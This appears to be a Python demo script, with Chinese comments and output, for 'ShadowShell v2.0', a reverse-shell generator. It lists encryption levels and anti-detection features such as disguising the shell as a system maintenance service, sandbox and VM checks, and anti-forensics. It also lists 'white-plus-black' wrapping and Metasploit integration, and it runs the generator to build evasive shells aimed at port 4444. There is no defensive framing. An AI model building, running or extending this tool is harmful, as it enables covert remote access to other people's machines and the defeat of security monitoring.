#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShadowShell 功能演示脚本
展示所有新增的功能特性
"""

import os
import sys
import tempfile
import shutil
from pathlib import Path

def print_banner():
    print("="*60)
    print("  ShadowShell v2.0 功能演示")
    print("  展示新增的功能特性")
    print("="*60)

def demo_encryption_levels():
    """演示加密级别功能"""
    print("\n🔐 演示功能 1: 加密级别选择")
    print("-" * 40)
    
    from modules.cipher import get_available_encryption_levels, get_encryption_level_description
    
    levels = get_available_encryption_levels()
    print(f"可用的加密级别 ({len(levels)} 个):")
    
    for i, level in enumerate(levels, 1):
        desc = get_encryption_level_description(level)
        print(f"  {i}. {level.upper()}: {desc}")
    
    print("\n加密算法对比测试:")
    from modules.cipher import AdvancedCipher
    
    test_data = "ShadowShell测试数据"
    
    for level in levels:
        cipher = AdvancedCipher("demo_key", level)
        encrypted = cipher.multi_layer_encrypt(test_data)
        size = len(encrypted)
        print(f"  {level:>8}: 加密后大小 {size:>4} bytes")

def demo_new_algorithms():
    """演示5个新加密算法"""
    print("\n🔒 演示功能 2: 新增的5个加密算法")
    print("-" * 40)
    
    from modules.cipher import AdvancedCipher
    
    cipher = AdvancedCipher("test_key_2023", "advanced")
    test_message = "这是加密算法测试消息"
    
    algorithms = [
        ("AES", cipher.aes_encrypt, cipher.aes_decrypt),
        ("RC4", cipher.rc4_encrypt, cipher.rc4_decrypt),
        ("ChaCha20", cipher.chacha20_encrypt, cipher.chacha20_decrypt),
        ("3DES", cipher.des3_encrypt, cipher.des3_decrypt),
        ("Blowfish", cipher.blowfish_encrypt, cipher.blowfish_decrypt)
    ]
    
    print("算法测试结果:")
    for name, encrypt_func, decrypt_func in algorithms:
        try:
            encrypted = encrypt_func(test_message)
            decrypted = decrypt_func(encrypted)
            success = "✅" if test_message == decrypted else "❌"
            print(f"  {name:>10}: {success} (密文长度: {len(encrypted)} bytes)")
        except Exception as e:
            print(f"  {name:>10}: ❌ 错误: {str(e)[:30]}...")

def demo_enhanced_anti_detection():
    """演示增强的反检测功能"""
    print("\n🛡️ 演示功能 3: 增强的反检测功能")
    print("-" * 40)
    
    from modules.anti_detection import create_advanced_evasion_code
    
    evasion_code = create_advanced_evasion_code()
    
    print("反检测技术特性:")
    
    features = [
        "伪装成系统维护服务",
        "多重虚拟机检测",
        "内存清理和反取证",
        "鼠标活动检测",
        "网络连接验证",
        "处理器数量检测",
        "主机名特征识别"
    ]
    
    for feature in features:
        print(f"  ✅ {feature}")
    
    print(f"\n生成的反检测代码长度: {len(evasion_code):,} 字符")
    print("包含完整的环境检测和对抗逻辑")

def demo_ui_enhancements():
    """演示UI改进"""
    print("\n🎨 演示功能 4: UI界面改进")
    print("-" * 40)
    
    print("新增的UI功能:")
    ui_features = [
        "加密级别选择界面",
        "配置确认和修改系统",
        "静默延迟时间设置",
        "15项配置的详细显示",
        "数字选择修改特定配置项",
        "实时配置验证"
    ]
    
    for feature in ui_features:
        print(f"  ✅ {feature}")
    
    print("\n命令行新参数:")
    print("  -e, --encryption-level: 选择加密级别")
    print("  --silent-delay: 设置静默延迟时间")

def demo_testing_framework():
    """演示测试框架"""
    print("\n🧪 演示功能 5: 综合测试框架")
    print("-" * 40)
    
    print("测试框架功能:")
    test_features = [
        "模块导入验证",
        "加密算法完整性测试", 
        "Shell生成功能测试",
        "反检测代码验证",
        "白加黑技术测试",
        "MSF集成检查",
        "自动化测试报告"
    ]
    
    for feature in test_features:
        print(f"  ✅ {feature}")
    
    print("\n运行测试框架:")
    print("  python3 test_shadowshell.py")

def demo_shell_generation():
    """演示Shell生成功能"""
    print("\n⚙️ 演示功能 6: Shell生成示例")
    print("-" * 40)
    
    # 创建临时目录用于演示
    demo_dir = tempfile.mkdtemp(prefix="shadowshell_demo_")
    
    try:
        print("生成不同加密级别的Shell文件...")
        
        import subprocess
        
        # 生成基础级别
        cmd_basic = [
            sys.executable, "main.py",
            "-i", "127.0.0.1", "-p", "4444",
            "-e", "basic",
            "-o", demo_dir,
            "-f", "basic_shell.py",
            "--quiet", "--silent-delay", "1"
        ]
        
        # 生成最高级别 
        cmd_maximum = [
            sys.executable, "main.py", 
            "-i", "127.0.0.1", "-p", "4444",
            "-e", "maximum",
            "-o", demo_dir,
            "-f", "maximum_shell.py",
            "--anti-detection",
            "--quiet", "--silent-delay", "1"
        ]
        
        # 生成白加黑版本
        cmd_whitelist = [
            sys.executable, "main.py",
            "-i", "127.0.0.1", "-p", "4444", 
            "-e", "advanced",
            "-o", demo_dir,
            "-f", "advanced_shell.py",
            "--use-white-black", "--white-black-mode", "wrapper",
            "--quiet", "--silent-delay", "1"
        ]
        
        # 执行生成命令
        for i, (cmd, desc) in enumerate([
            (cmd_basic, "基础加密"),
            (cmd_maximum, "最高加密"),
            (cmd_whitelist, "白加黑技术")
        ], 1):
            print(f"  {i}. 生成{desc}Shell...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                print(f"     ✅ 成功")
            else:
                print(f"     ❌ 失败: {result.stderr[:50]}...")
        
        # 显示生成的文件
        generated_files = list(Path(demo_dir).glob("*.py"))
        if generated_files:
            print(f"\n生成的文件 ({len(generated_files)} 个):")
            for file_path in generated_files:
                size = file_path.stat().st_size
                size_str = f"{size:,} bytes" if size < 1024*1024 else f"{size/(1024*1024):.1f} MB"
                print(f"  📄 {file_path.name}: {size_str}")
        
    except Exception as e:
        print(f"❌ 演示失败: {e}")
    finally:
        # 清理临时目录
        shutil.rmtree(demo_dir, ignore_errors=True)

def main():
    """主演示函数"""
    print_banner()
    
    # 依次演示各个功能
    demo_encryption_levels()
    demo_new_algorithms()
    demo_enhanced_anti_detection()
    demo_ui_enhancements()
    demo_testing_framework()
    demo_shell_generation()
    
    print("\n" + "="*60)
    print("🎉 ShadowShell v2.0 功能演示完成！")
    print("\n主要改进总结:")
    print("✅ 4个加密级别供选择 (basic/standard/advanced/maximum)")
    print("✅ 5个新加密算法 (AES/RC4/ChaCha20/3DES/Blowfish)")
    print("✅ 增强的反检测和伪装技术")
    print("✅ 改进的用户界面和配置确认")
    print("✅ 综合测试框架和验证系统")
    print("✅ 灵活的静默延迟时间设置")
    print("="*60)

if __name__ == "__main__":
    main()